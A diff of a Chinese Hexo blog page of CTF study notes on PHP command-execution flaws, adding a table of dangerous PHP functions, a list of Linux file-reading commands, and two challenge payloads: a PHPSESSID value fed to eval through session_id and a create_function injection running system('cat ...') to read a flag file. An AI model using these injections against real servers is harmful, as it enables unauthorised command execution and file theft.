@@ -45,7 +45,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2025-02-05T07:42:02.000Z">
-<meta property="article:modified_time" content="2025-04-12T01:48:00.065Z">
+<meta property="article:modified_time" content="2025-05-29T12:58:41.128Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1747655058976),
+    lastupdate: new Date(1748691064524),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2667,9 +2667,161 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <td>将多个命令用;分隔开可以运行多个命令</td>
 </tr>
 </tbody></table>
-<h2 id="2-危险函数"><a href="#2-危险函数" class="headerlink" title="2.危险函数"></a>2.危险函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">php代码相关</span><br><span class="line"><span class="keyword">eval</span>()</span><br><span class="line"><span class="title function_ invoke__">assert</span>()</span><br><span class="line">preg_replace</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>()</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>()</span><br><span class="line">create_function</span><br><span class="line"><span class="title function_ invoke__">array_map</span>()</span><br><span class="line">系统命令执行相关</span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line">`(反单引号)</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>()</span><br><span class="line">特殊函数</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>()</span><br><span class="line"><span class="comment">#这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息</span></span><br><span class="line"><span class="title function_ invoke__">symlink</span>()：</span><br><span class="line"><span class="comment">#一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容</span></span><br><span class="line">getenv</span><br><span class="line"><span class="comment">#获取一个环境变量的值</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="comment">#添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态</span></span><br></pre></td></tr></table></figure>
+<h2 id="2-危险函数"><a href="#2-危险函数" class="headerlink" title="2.危险函数"></a>2.危险函数</h2><table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">返回值类型</th>
+<th align="left">是否直接打印输出</th>
+<th align="left">示例</th>
+<th align="left">安全风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><code>shell_exec()</code></strong></td>
+<td align="left"><code>string</code></td>
+<td align="left">❌ 否</td>
+<td align="left"><code>$out = shell_exec(&#39;ls&#39;);</code></td>
+<td align="left">高风险，需严格过滤输入</td>
+</tr>
+<tr>
+<td align="left"><strong>反引号 &#96;&#96;&#96;</strong></td>
+<td align="left"><code>string</code></td>
+<td align="left">❌ 否</td>
+<td align="left"><code>$out = </code>ls<code>;</code></td>
+<td align="left">同 <code>shell_exec()</code></td>
+</tr>
+<tr>
+<td align="left"><strong><code>exec()</code></strong></td>
+<td align="left">最后一行或数组</td>
+<td align="left">❌ 否</td>
+<td align="left"><code>exec(&#39;ls&#39;, $output);</code></td>
+<td align="left">需注意第二个参数（数组输出）</td>
+</tr>
+<tr>
+<td align="left"><strong><code>passthru()</code></strong></td>
+<td align="left"><code>void</code></td>
+<td align="left">✅ 是</td>
+<td align="left"><code>passthru(&#39;ls&#39;);</code></td>
+<td align="left">直接输出，高危</td>
+</tr>
+<tr>
+<td align="left"><strong><code>system()</code></strong></td>
+<td align="left">最后一行</td>
+<td align="left">✅ 是</td>
+<td align="left"><code>system(&#39;ls&#39;);</code></td>
+<td align="left">直接输出，高危</td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">php代码相关</span><br><span class="line"><span class="keyword">eval</span>()</span><br><span class="line"><span class="title function_ invoke__">assert</span>()</span><br><span class="line">preg_replace</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>()</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>()</span><br><span class="line">create_function</span><br><span class="line"><span class="title function_ invoke__">array_map</span>()</span><br><span class="line">系统命令执行相关</span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line">`(反单引号)</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>()</span><br><span class="line">特殊函数</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>()</span><br><span class="line"><span class="comment">#这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息</span></span><br><span class="line"><span class="title function_ invoke__">symlink</span>()：</span><br><span class="line"><span class="comment">#一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容</span></span><br><span class="line">getenv</span><br><span class="line"><span class="comment">#获取一个环境变量的值</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="comment">#添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态</span></span><br></pre></td></tr></table></figure>
 
 <p>危险函数太多了，全部记住基本不可能，全部写下来也很麻烦，看得多了就记住了。到时候php手册会帮我的</p>
+<table>
+<thead>
+<tr>
+<th><code>cat</code></th>
+<th>显示整个文件内容</th>
+<th><code>cat file.txt</code></th>
+<th>快速查看小文件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>less</code></td>
+<td>分页交互式查看（可上下翻页）</td>
+<td><code>less file.txt</code></td>
+<td>查看大文件或日志</td>
+</tr>
+<tr>
+<td><code>more</code></td>
+<td>分页查看（仅向下翻页）</td>
+<td><code>more file.txt</code></td>
+<td>基础分页（兼容性高）</td>
+</tr>
+<tr>
+<td><code>head</code></td>
+<td>显示文件开头部分（默认前 10 行）</td>
+<td><code>head -n 20 file.txt</code></td>
+<td>查看文件头部内容</td>
+</tr>
+<tr>
+<td><code>tail</code></td>
+<td>显示文件末尾部分（默认后 10 行）</td>
+<td><code>tail -n 20 file.txt</code></td>
+<td>查看日志或文件尾部</td>
+</tr>
+<tr>
+<td><code>tac</code></td>
+<td>反向显示文件内容（从最后一行到第一行）</td>
+<td><code>tac file.txt</code></td>
+<td>逆向查看日志</td>
+</tr>
+<tr>
+<td><code>nl</code></td>
+<td>显示内容并添加行号</td>
+<td><code>nl file.txt</code></td>
+<td>需要行号时</td>
+</tr>
+<tr>
+<td><code>grep</code></td>
+<td>过滤包含特定模式的行</td>
+<td><code>grep &quot;error&quot; file.txt</code></td>
+<td>搜索关键词</td>
+</tr>
+<tr>
+<td><code>awk</code></td>
+<td>按列或条件提取内容</td>
+<td><code>awk &#39;&#123;print $1&#125;&#39; file.txt</code></td>
+<td>处理结构化文本（如 CSV）</td>
+</tr>
+<tr>
+<td><code>sed</code></td>
+<td>流编辑器，支持按行提取</td>
+<td><code>sed -n &#39;5,10p&#39; file.txt</code></td>
+<td>提取特定行或替换内容</td>
+</tr>
+<tr>
+<td><code>cut</code></td>
+<td>按列分割提取内容</td>
+<td><code>cut -d &#39;,&#39; -f 1 file.txt</code></td>
+<td>提取特定列（如分隔符文件）</td>
+</tr>
+<tr>
+<td><code>strings</code></td>
+<td>提取二进制文件中的可打印字符串</td>
+<td><code>strings /bin/ls</code></td>
+<td>分析二进制文件</td>
+</tr>
+<tr>
+<td><code>od</code></td>
+<td>以二进制&#x2F;十六进制格式查看</td>
+<td><code>od -c file.txt</code></td>
+<td>查看文件原始编码</td>
+</tr>
+<tr>
+<td><code>xxd</code></td>
+<td>生成十六进制转储</td>
+<td><code>xxd file.txt</code></td>
+<td>二进制文件分析</td>
+</tr>
+<tr>
+<td><code>rev</code></td>
+<td>反转每行字符顺序</td>
+<td><code>rev file.txt</code></td>
+<td>调试或特殊需求</td>
+</tr>
+<tr>
+<td><code>zcat</code></td>
+<td>直接查看压缩文件（<code>.gz</code> 格式）</td>
+<td><code>zcat file.gz</code></td>
+<td>无需解压查看压缩文件</td>
+</tr>
+<tr>
+<td><code>vim</code>&#x2F;<code>nano</code></td>
+<td>文本编辑器打开文件</td>
+<td><code>vim file.txt</code></td>
+<td>需要编辑时</td>
+</tr>
+</tbody></table>
 <h3 id="1-system"><a href="#1-system" class="headerlink" title="1.system()"></a>1.system()</h3><p>system — 执行外部程序，并且显示输出</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
 
@@ -2922,6 +3074,20 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万</p>
 <p><code>preg_match</code>函数返回false表示此次执行失败了，我们可以调用<code>var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);</code>，发现失败的原因的确是回溯次数超出了限制：</p>
 <p>于是我们的字符串就可以通过回溯次数超过限制返回false来绕过正则匹配</p>
+<h2 id="10-做题经验和payload"><a href="#10-做题经验和payload" class="headerlink" title="10.做题经验和payload"></a>10.做题经验和payload</h2><p>到最后还是要收集payload，和各种绕过姿势</p>
+<p>除了上面提到的各种绕过方法这里就只剩下做题经验了</p>
+<h3 id="1-session命令执行"><a href="#1-session命令执行" class="headerlink" title="1.session命令执行"></a>1.session命令执行</h3><p>使用session进行命令执行是我没想到的，原理和跳板差不多，只不过可以不用POST和GET就能跳板</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">urldecode</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br></pre></td></tr></table></figure>
+
+<p>通过session_start()启动会话，然后使用session_id()获取当前的会话id，最后eval进行命令执行</p>
+<p>由于session_id中不能出现引号，因此通过两次url编码来解决</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHPSESSID=<span class="title function_ invoke__">highlight_file</span>(%<span class="number">2522</span>flag.php%<span class="number">2522</span>)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-creat-function"><a href="#2-creat-function" class="headerlink" title="2.creat_function()"></a>2.creat_function()</h3><p>这个函数在某些方面可以进行命令执行，需要<code>$</code>没有被过滤，而且对php版本有要求</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=<span class="keyword">echo</span> <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])();&amp;cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /tgfffffllllaagggggg&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
 
   </div>
   
@@ -2946,10 +3112,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-04-12T09:48:00+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-05-29T20:58:41+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Apr 12, 2025</p>
+    <p>更新于：May 29, 2025</p>
   </a>
 </div>
 
@@ -3093,7 +3259,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">1.什么是命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BA%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">2.出现漏洞的原因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6"><span class="toc-text">1.命令拼接符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Windows"><span class="toc-text">1.Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Linux"><span class="toc-text">2.Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">2.危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-system"><span class="toc-text">1.system()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-passthru"><span class="toc-text">2.passthru()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-exec"><span class="toc-text">3.exec()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">3.过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-text">1.通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B3%E9%94%AE%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-text">2.关键符过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4%E7%BB%83%E4%B9%A0"><span class="toc-text">3.综合过滤练习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">4.空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-text">5.关键词绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%A9%BA%E5%8F%98%E9%87%8F"><span class="toc-text">6.空变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%97%A0%E5%8F%82RCE"><span class="toc-text">4.无参RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0"><span class="toc-text">1.函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-localeconv"><span class="toc-text">1.localeconv()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-current"><span class="toc-text">2.current()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-scandir"><span class="toc-text">3.scandir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-chdir"><span class="toc-text">4.chdir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-array-reverse"><span class="toc-text">5.array_ reverse()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-highlight-file"><span class="toc-text">6.highlight_file()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-getcwd"><span class="toc-text">7.getcwd()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-dirname"><span class="toc-text">8.dirname()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-get-defined-vars"><span class="toc-text">9.get_defined_vars()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%BC%82%E6%88%96%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6"><span class="toc-text">5.异或拼接字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-text">6.取反绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-dev-null-2-1"><span class="toc-text">7. &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-text">8.无回显RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">1.反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6"><span class="toc-text">2.重定向符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-dnslog%E5%A4%96%E5%B8%A6"><span class="toc-text">3.dnslog外带</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87-%E6%AD%A3%E5%88%99%E6%BA%A2%E5%87%BA"><span class="toc-text">9.PCRE回溯次数限制绕过(正则溢出)</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">1.什么是命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BA%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">2.出现漏洞的原因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%91%BD%E4%BB%A4%E6%8B%BC%E6%8E%A5%E7%AC%A6"><span class="toc-text">1.命令拼接符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Windows"><span class="toc-text">1.Windows</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Linux"><span class="toc-text">2.Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">2.危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-system"><span class="toc-text">1.system()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-passthru"><span class="toc-text">2.passthru()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-exec"><span class="toc-text">3.exec()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">3.过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-text">1.通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B3%E9%94%AE%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-text">2.关键符过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4%E7%BB%83%E4%B9%A0"><span class="toc-text">3.综合过滤练习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">4.空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-text">5.关键词绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%A9%BA%E5%8F%98%E9%87%8F"><span class="toc-text">6.空变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%97%A0%E5%8F%82RCE"><span class="toc-text">4.无参RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%87%BD%E6%95%B0"><span class="toc-text">1.函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-localeconv"><span class="toc-text">1.localeconv()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-current"><span class="toc-text">2.current()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-scandir"><span class="toc-text">3.scandir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-chdir"><span class="toc-text">4.chdir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-array-reverse"><span class="toc-text">5.array_ reverse()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-highlight-file"><span class="toc-text">6.highlight_file()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-getcwd"><span class="toc-text">7.getcwd()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-dirname"><span class="toc-text">8.dirname()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9-get-defined-vars"><span class="toc-text">9.get_defined_vars()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E5%BC%82%E6%88%96%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6"><span class="toc-text">5.异或拼接字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-text">6.取反绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-dev-null-2-1"><span class="toc-text">7. &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-text">8.无回显RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">1.反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%87%8D%E5%AE%9A%E5%90%91%E7%AC%A6"><span class="toc-text">2.重定向符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-dnslog%E5%A4%96%E5%B8%A6"><span class="toc-text">3.dnslog外带</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87-%E6%AD%A3%E5%88%99%E6%BA%A2%E5%87%BA"><span class="toc-text">9.PCRE回溯次数限制绕过(正则溢出)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-%E5%81%9A%E9%A2%98%E7%BB%8F%E9%AA%8C%E5%92%8Cpayload"><span class="toc-text">10.做题经验和payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-session%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">1.session命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-creat-function"><span class="toc-text">2.creat_function()</span></a></li></ol></li></ol>
     </div>
   </section>
 
@@ -3663,7 +3829,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":""},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Hexo"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2025/02/05/php命令执行/","name":"php命令执行"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Hexo","url":"http://example.com/","keywords":null,"description":"","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":""},"publisher":{"@type":"Organization","name":"Hexo","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"php命令执行","description":"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/02/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},"author":{"@type":"Person","name":"John 